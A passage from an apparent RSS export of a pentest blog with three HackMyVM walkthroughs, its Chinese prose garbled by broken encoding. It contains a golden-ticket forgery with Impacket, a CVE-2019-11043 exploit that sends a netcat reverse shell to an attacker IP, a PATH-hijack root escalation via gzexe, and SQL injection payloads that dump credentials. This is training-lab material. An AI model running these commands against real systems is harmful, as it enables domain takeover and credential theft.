é»„é‡‘ç¥¨è¯æ˜¯ä¸€ç§æƒé™ç»´æŒæ‰‹æ®µï¼Œæ”»å‡»è€…è·å¾—äº†å¯¹Active Directoryå¯†é’¥åˆ†å‘æœåŠ¡å¸æˆ·KRBTGTçš„æ§åˆ¶æƒï¼Œå¹¶ä½¿ç”¨è¯¥å¸æˆ·ä¼ªé€ æœ‰æ•ˆçš„Kerberosç¥¨è¯æˆäºˆç¥¨è¯TGTã€‚è¿™ä½¿æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®Active DirectoryåŸŸä¸Šçš„ä»»ä½•èµ„æºï¼Œå¦‚æœæœ‰KRBTGTå“ˆå¸Œï¼Œæ‚¨å¯ä»¥ä¼ªé€ è‡ªå·±çš„TGTï¼Œå…¶ä¸­åŒ…æ‹¬æƒ³è¦çš„ä»»ä½•ç»„æˆå‘˜èº«ä»½çš„PACæ•°æ®ã€‚
<br><br>
<br>è·å–åŸŸä¸­krbtgtç”¨æˆ·ä½¿ç”¨çš„åŠ å¯†å¯†é’¥ ï¼ˆè¿™é‡Œå·²ç»è·å–åˆ°äº†krbtgtç”¨æˆ·çš„NTLM hashï¼‰
<br>ç›®æ ‡åŸŸå åŸŸSID
<br>æˆ‘ä»¬ç°åœ¨è·å–åˆ°äº†KRBTGTå“ˆå¸Œ å…ˆéªŒè¯ä¸€ä¸‹æ˜¯å¦æ˜¯æ­£ç¡®çš„<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# crackmapexec smb 192.168.56.126 -u krbtgt -H '0f55cdc40bd8f5814587f7e6b2f85e6f'
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:0f55cdc40bd8f5814587f7e6b2f85e6f STATUS_ACCOUNT_DISABLED

<br>å¾ˆå¥½æ˜¯æ­£ç¡®çš„<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# impacket-lookupsid soupedecode.local/rtina979:c1trus123@192.168.56.126 |grep SID
[*] Brute forcing SIDs at 192.168.56.126
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# rdate -n 192.168.56.126
Thu Dec 19 19:05:54 EST 2024

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# impacket-ticketer -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain-sid S-1-5-21-2986980474-46765180-2505414164 -domain soupedecode.local  administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for soupedecode.local/administrator
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in administrator.ccache

<br><br>export KRB5CCNAME=administrator.ccache
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/dc04]
â””â”€# impacket-wmiexec soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] SMBv3.0 dialect used

[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;
C:\&gt;id
'id' is not recognized as an internal or external command,
operable program or batch file.

C:\&gt;whoami
soupedecode.local\administrator


C:\users\administrator\desktop&gt;type root.txt
1c66eabe105636d7e0b82ec1fa87cb7a

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/38.dc04.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/38.DC04.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[37.emma]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ï¸ä¿¡æ¯æ”¶é›†" data-href="#2. ï¸ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ï¸ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ï¸ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. phpinfoæ¼æ´åˆ©ç”¨" data-href="#3. phpinfoæ¼æ´åˆ©ç”¨" href="https://www.c1trus.top/about:blank#3._phpinfoæ¼æ´åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">3. phpinfoæ¼æ´åˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="4. www-dataææƒemma" data-href="#4. www-dataææƒemma" href="https://www.c1trus.top/about:blank#4._www-dataææƒemma" class="internal-link" target="_self" rel="noopener nofollow">4. www-dataææƒemma</a>
<br><a data-tooltip-position="top" aria-label="5. emmaææƒroot" data-href="#5. emmaææƒroot" href="https://www.c1trus.top/about:blank#5._emmaææƒroot" class="internal-link" target="_self" rel="noopener nofollow">5. emmaææƒroot</a><br>
- <a data-tooltip-position="top" aria-label="5.1. gzexeåˆ©ç”¨ åŠ«æŒzip" data-href="#5.1. gzexeåˆ©ç”¨ åŠ«æŒzip" href="https://www.c1trus.top/about:blank#5.1._gzexeåˆ©ç”¨_åŠ«æŒzip" class="internal-link" target="_self" rel="noopener nofollow">5.1. gzexeåˆ©ç”¨ åŠ«æŒzip</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Emma" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Emma</a><br>
ä½œè€…  Emma<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# nmap -sCV 192.168.200.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:02 CST
Nmap scan report for chimichurri.thl (192.168.200.4)
Host is up (0.000090s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:4c:af:92:cc:bb:99:59:d7:2f:1b:99:fb:f1:7c:f0 (RSA)
|   256 ba:0d:85:69:43:86:c1:91:7c:db:2a:1e:34:ab:68:1e (ECDSA)
|_  256 a1:ac:2c:ce:f4:07:da:96:12:74:d1:54:9e:f7:09:04 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:64:B9:B4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# nmap 192.168.200.4 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:02 CST
Nmap scan report for chimichurri.thl (192.168.200.4)
Host is up (0.00030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:64:B9:B4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds

<br>é¦–é¡µ <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# curl http://192.168.200.4

ç©ºçš„
<br>ç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# dirsearch -u http://192.168.200.4
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/emma/reports/http_192.168.200.4/_24-12-04_12-05-14.txt

Target: http://192.168.200.4/

[12:05:14] Starting:
[12:05:29] 200 -   58KB - /phpinfo.php
[12:05:31] 200 -   15B  - /robots.txt


â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# curl http://192.168.200.4/robots.txt
itwasonlyakiss

<br>è·å–åˆ°ä¸€ä¸ªå…³é”®å­—ç¬¦ä¸² itwasonlyakiss  å¯èƒ½æ˜¯å¯†ç æˆ–è€…ç”¨æˆ·<br><br>ç»™äº†æˆ‘ä»¬Phpinfo.index<br>
çŒœæµ‹æ˜¯è¦æ‰“ä¸€æ³¢cve<br>
çœ‹ä¸€ä¸‹phpçš„ç‰ˆæœ¬<br>
<img alt="Pasted image 20241204123101" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png" referrerpolicy="no-referrer"><br>
ç‰ˆæœ¬ä¸º 7.1.33dev<br>æ‰¾åˆ°ä¸€ä¸ªrceçš„æ¼æ´ <a data-tooltip-position="top" aria-label="../../20-ç½‘å®‰/28-CVEå¤ç°/CVE-2019-11043" data-href="../../20-ç½‘å®‰/28-CVEå¤ç°/CVE-2019-11043" href="https://www.c1trus.top/20-ç½‘å®‰/28-cveå¤ç°/cve-2019-11043.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2019-11043</a><br>
<a rel="noopener nofollow" class="external-link" href="https://blog.csdn.net/qq_42133828/article/details/102868522" target="_blank">https://blog.csdn.net/qq_42133828/article/details/102868522</a><br>æ¼æ´åˆ©ç”¨é¡¹ç›®åœ°å€ github.com/neex/phuip-fpizdam<br>å®‰è£…ç¯å¢ƒ<br>apt-get install golang
go get github.com/neex/phuip-fpizdam
export PATH=$PATH:$(go env GOPATH)/bin
<br>æ¼æ´æ¢­å“ˆ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# phuip-fpizdam http://192.168.42.43/index.php
2024/12/04 12:39:32 Base status code is 200
2024/12/04 12:39:32 Status code 502 for qsl=1765, adding as a candidate
2024/12/04 12:39:32 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2024/12/04 12:39:32 Attack params found: --qsl 1755 --pisos 23 --skip-detect
2024/12/04 12:39:32 Trying to set "session.auto_start=0"...
2024/12/04 12:39:32 Detect() returned attack params: --qsl 1755 --pisos 23 --skip-detect &lt;-- REMEMBER THIS
2024/12/04 12:39:32 Performing attack using php.ini settings...
2024/12/04 12:39:33 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&amp;" to URLs
2024/12/04 12:39:33 Trying to cleanup /tmp/a...
2024/12/04 12:39:33 Done!

<br>åå¼¹shell<br>urlencode('id;nc -e /bin/bash 192.168.42.39 1234 ')
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/emma]
â””â”€# curl http://192.168.42.115/index.php/?a=/bin/sh+-c+%27id%3Bnc%20-e%20%2Fbin%2Fbash%20192.168.42.39%201234%20%27

â”Œâ”€â”€(pwncat-env)â”€(rootã‰¿kali)-[~]
â””â”€# pwncat-cs -lp 1234
[12:41:29] Welcome to pwncat ğŸˆ!                                                                       __main__.py:164
[12:50:54] received connection from 192.168.42.115:55396                                                    bind.py:84
[12:50:55] 192.168.42.115:55396: registered new host w/ db                                              manager.py:957
(local) pwncat$
(remote) www-data@emma:/var/www/html$ whoami
www-data
(remote) www-data@emma:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@emma:/var/www/html$

<br><br>(remote) www-data@emma:/var/www/html$ find / -perm /4000 2&gt;/dev/null
/home/emma/who
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
<br>é¶æœºå†…éƒ¨å¼€æ”¾äº† 3306 ç«¯å£<br>
å¯ä»¥çœ‹ä¸€ä¸‹æ•°æ®åº“<br>
æ•°æ®åº“å¯†ç å°±æ˜¯robots.txt é‡Œé¢çš„é‚£ä¸ª itwasonlyakiss<br>remote) www-data@emma:/etc$ mysql -uroot -pitwasonlyakiss
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 13
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| users              |
+--------------------+
4 rows in set (0.012 sec)

MariaDB [(none)]&gt; use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [users]&gt; show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.000 sec)

MariaDB [users]&gt; select * from users;
+----+------+----------------------------------+
| id | user | pass                             |
+----+------+----------------------------------+
|  1 | emma | 5f4dcc3b5aa765d61d8327deb882cf80 |
+----+------+----------------------------------+
1 row in set (0.000 sec)

<br><img alt="Pasted image 20241204131238" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204131238.png" referrerpolicy="no-referrer"><br><br>è¿™é‡Œæœ‰ä¸€ä¸ªå‘ã€‚ è¿™ä¸ªemmaçš„å¯†ç ä¸æ˜¯è§£å¯†åçš„æ˜æ–‡ å°±æ˜¯è¿™ä¸ªMd5å€¼<br>(remote) www-data@emma:/etc$ su emma
Password:  5f4dcc3b5aa765d61d8327deb882cf80
emma@emma:/etc$

emma@emma:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: emma

PWNED DATE: Wed 04 Dec 2024 12:16:48 AM EST

WHOAMI: uid=1000(emma) gid=1000(emma) groups=1000(emma),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: youdontknowme

------------------------

<br>emma@emma:~$ cat who.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void main(){
setuid(0);
setgid(0);
printf("Im \n");
system("/bin/id");
setuid(1000);
setgid(1000);
printf("But now Im \n");
system("/bin/id");
}

emma@emma:~$ ls -la
total 64
drwxr-xr-x 4 emma emma  4096 Dec  4 00:14 .
drwxr-xr-x 3 root root  4096 Feb  4  2021 ..
-rw-r--r-- 1 emma emma   220 Feb  4  2021 .bash_logout
-rw-r--r-- 1 emma emma  3526 Feb  4  2021 .bashrc
-rwx------ 1 emma emma  1920 Feb  4  2021 flag.sh
drwx------ 3 emma emma  4096 Dec  4 00:14 .gnupg
drwxr-xr-x 3 emma emma  4096 Feb  4  2021 .local
-rw-r--r-- 1 emma emma   807 Feb  4  2021 .profile
-rw------- 1 emma emma    14 Feb  4  2021 user.txt
-rwsr-s--- 1 root emma 16760 Feb  4  2021 who
-rw-r--r-- 1 emma emma   185 Feb  4  2021 who.c
-rw------- 1 emma emma    50 Feb  4  2021 .Xauthority

emma@emma:~$ sudo -l
Matching Defaults entries for emma on emma:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User emma may run the following commands on emma:
    (ALL : ALL) NOPASSWD: /usr/bin/gzexe

<br>æˆ‘ä»¬å¯ä»¥ç”¨Rootæƒé™è°ƒç”¨ gzexe å‘½ä»¤ <br><br>gzexe å®é™…ä¸Šæ˜¯ä¸€ä¸ªè„šæœ¬å¯ä»¥å‹ç¼©ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚è€Œä¸”è¿™ä¸ªè¢«å‹ç¼©åçš„æ–‡ä»¶åå­—ä¸ä¼šè¢«æ”¹å˜è€Œä¸”ä¹Ÿå¯ä»¥è¢«æ‰§è¡Œï¼Œæ‰§è¡Œè¢«å‹ç¼©åçš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ ä¼šè°ƒç”¨gzipå‘½ä»¤è§£å‹ç¼©<br>
æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡åŠ«æŒ gzip æ¥ææƒ<br>
ä½†æ˜¯è¦ææƒè‚¯å®šæ˜¯éœ€è¦ä¸€ä¸ªrootçš„æƒé™å»æ‰§è¡Œ gzipï¼Œ<br>åªè¦Aè¢« gzexe å‹ç¼©ï¼Œé‚£ä¹ˆæ‰§è¡Œ A å°±ä¼šè§¦å‘ gzip<br>
å…³é”®ç‚¹åœ¨äºæˆ‘ä»¬æ‰¾å“ªä¸ªAè¢« gzexe å‹ç¼©<br>è¦æ±‚Aå¿…é¡»èƒ½è¢«rootæƒé™æ‰§è¡Œ<br>emma@emma:~$ cat who.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void main(){
setuid(0);
setgid(0);
printf("Im \n");
system("/bin/id");
setuid(1000);
setgid(1000);
printf("But now Im \n");
system("/bin/id");
}

emma@emma:~$ ls -la
total 64
drwxr-xr-x 4 emma emma  4096 Dec  4 00:14 .
drwxr-xr-x 3 root root  4096 Feb  4  2021 ..
-rw-r--r-- 1 emma emma   220 Feb  4  2021 .bash_logout
-rw-r--r-- 1 emma emma  3526 Feb  4  2021 .bashrc
-rwx------ 1 emma emma  1920 Feb  4  2021 flag.sh
drwx------ 3 emma emma  4096 Dec  4 00:14 .gnupg
drwxr-xr-x 3 emma emma  4096 Feb  4  2021 .local
-rw-r--r-- 1 emma emma   807 Feb  4  2021 .profile
-rw------- 1 emma emma    14 Feb  4  2021 user.txt
-rwsr-s--- 1 root emma 16760 Feb  4  2021 who
-rw-r--r-- 1 emma emma   185 Feb  4  2021 who.c
-rw------- 1 emma emma    50 Feb  4  2021 .Xauthority

<br>å¯ä»¥å‘ç°æˆ‘ä»¬æ˜¯å¯ä»¥æ‰§è¡Œ who çš„ï¼Œè€Œä¸” ä» who.c é‡Œé¢çœ‹å‡ºé‡Œé¢ä¸¤æ¬¡æ‰§è¡Œäº† /bin/id ï¼Œ<br>
ä¸€æ¬¡æ˜¯rootæ‰§è¡Œï¼Œä¸€æ¬¡æ˜¯æ™®é€šç”¨æˆ·æ‰§è¡Œ<br>é‚£æˆ‘ä»¬åªè¦åˆ©ç”¨ gzexe å‹ç¼© /bin/idï¼Œç„¶åæ‰§è¡Œ who è§¦å‘ gzip å®Œæˆææƒ<br>ç¯å¢ƒå˜é‡åŠ«æŒgzipï¼š
echo 'chmod +s /bin/bash' &gt; /tmp/gzip
chmod +x /tmp/gzip
export PATH=/tmp:$PATH

gzexeå‹ç¼©id:
gzexe /bin/id

æ‰§è¡Œwhoè§¦å‘gzipå®Œæˆææƒ
./who
bash -p
<br>bash-5.0# cat /root/root.txt
itsmeimshe
bash-5.0# cat /home/emma/user.txt
youdontknowme
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/37.emma.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/37.emma.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[36.Adroit]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. javaåç¼–è¯‘" data-href="#3. javaåç¼–è¯‘" href="https://www.c1trus.top/about:blank#3._javaåç¼–è¯‘" class="internal-link" target="_self" rel="noopener nofollow">3. javaåç¼–è¯‘</a>
<br><a data-tooltip-position="top" aria-label="4. sqlæ³¨å…¥" data-href="#4. sqlæ³¨å…¥" href="https://www.c1trus.top/about:blank#4._sqlæ³¨å…¥" class="internal-link" target="_self" rel="noopener nofollow">4. sqlæ³¨å…¥</a>
<br><a data-tooltip-position="top" aria-label="5. è§£å¯†å¯†ç " data-href="#5. è§£å¯†å¯†ç " href="https://www.c1trus.top/about:blank#5._è§£å¯†å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">5. è§£å¯†å¯†ç </a>
<br><a data-tooltip-position="top" aria-label="6. ææƒ" data-href="#6. ææƒ" href="https://www.c1trus.top/about:blank#6._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">6. ææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Adroit" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Adroit</a><br>
ä½œè€… alienum<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# fscan -h 192.168.80.11

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.80.11:3306 open
192.168.80.11:3000 open
192.168.80.11:21 open
192.168.80.11:22 open
[*] alive ports len is: 4
start vulscan
[+] ftp 192.168.80.11:21:anonymous
   [-&gt;]pub

<br>ftp<br>ftp&gt; ls -a
229 Entering Extended Passive Mode (|||40570|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..
-rw-r--r--    1 ftp      ftp          5451 Jan 14  2021 adroitclient.jar
-rw-r--r--    1 ftp      ftp           229 Mar 19  2021 note.txt
-rw-r--r--    1 ftp      ftp         36430 Jan 14  2021 structure.PNG

<br>structrue.png<br>
<img alt="Pasted image 20241203164149" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png" referrerpolicy="no-referrer"><br><br><img alt="Pasted image 20241203164747" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164747.png" referrerpolicy="no-referrer"><br>
è·å–åˆ°secret Sup3rS3cur3Dr0it<br>
<img alt="Pasted image 20241203165012" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203165012.png" referrerpolicy="no-referrer"><br>
åŸŸå adroit.local<br>
<img alt="Pasted image 20241203165048" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203165048.png" referrerpolicy="no-referrer"><br>
ç”¨æˆ·å zeus åŸŸå god.thunder.olympus<br>æ·»åŠ ä¸€ä¸ªåŸŸå adroit.local<br>å°è¯•è¿è¡Œä¸€ä¸‹jaråŒ…<br>
è¿™é‡Œæˆ‘ç”¨jdk8è¿è¡Œä¸äº† ï¼Œåˆ‡æ¢åˆ°jdk11å¯ä»¥è¿è¡Œ
<br>æç¤ºè¾“å…¥è´¦æˆ·å¯†ç  æŒ¨ä¸ªæµ‹è¯•å³å¯<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
Sup3rS3cur3Dr0it
Wrong username or password   

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
god.thunder.olympus
Options [ post | get ] :
get
Enter the phrase identifier :
1

<br>god.thunder.olympus å°±æ˜¯å¯†ç <br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# java -jar adroitclient.jar
Enter the username :
zeus
Enter the password :
god.thunder.olympus
Options [ post | get ] :
get
Enter the phrase identifier :

1 union select 1,database() -- -
--&gt; adroit

1 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema ='adroit' -- -
--&gt;  ideas,users

1 union select 1,group_concat(column_name) from information_schema.columns where table_name ='users' -- -
--&gt; 
id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS

1 union select 1,group_concat(username,0x3a,password) from users -- -
--&gt; writer:l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=
<br>è·å–åˆ°äº†è´¦æˆ·å¯†ç  writer:l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=<br>
ä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„<br>ä½†æ˜¯åŠ å¯†çš„<br><br>è§£å¯†çš„ä»£ç å¯ä»¥åœ¨jaråŒ…åç¼–è¯‘ä¸­å‘ç°<br>
<img alt="Pasted image 20241203172527" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203172527.png" referrerpolicy="no-referrer"><br>
å¯†é’¥ä¸Šé¢è·å–åˆ°äº†æ˜¯ Sup3rS3cur3Dr0it<br>
ä½†æ˜¯æ³¨æ„è¿™é‡Œéœ€è¦å°†0æ¢æˆO<br>
æ‰€ä»¥æ­£ç¡®çš„å¯†é’¥æ˜¯ Sup3rS3cur3DrOit<br>å‚è€ƒ <a data-tooltip-position="top" aria-label="https://mikannse.space/2024/02/17/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B9%9D%E4%B8%89)%E4%B9%8BHMVAndroit/" rel="noopener nofollow" class="external-link" href="https://mikannse.space/2024/02/17/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B9%9D%E4%B8%89)%E4%B9%8BHMVAndroit/" target="_blank">Mikannseçš„wp</a>å¯¹è¿™ä¸ªè¿›è¡Œè§£å¯†<br>è·å–åˆ°å¯†ç æ˜¯ just.write.my.ideas<br><br>åˆ©ç”¨è´¦æˆ·å¯†ç ç™»å½•<br>writer ï¼š just.write.my.ideas
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Adroit]
â””â”€# ssh writer@192.168.80.11
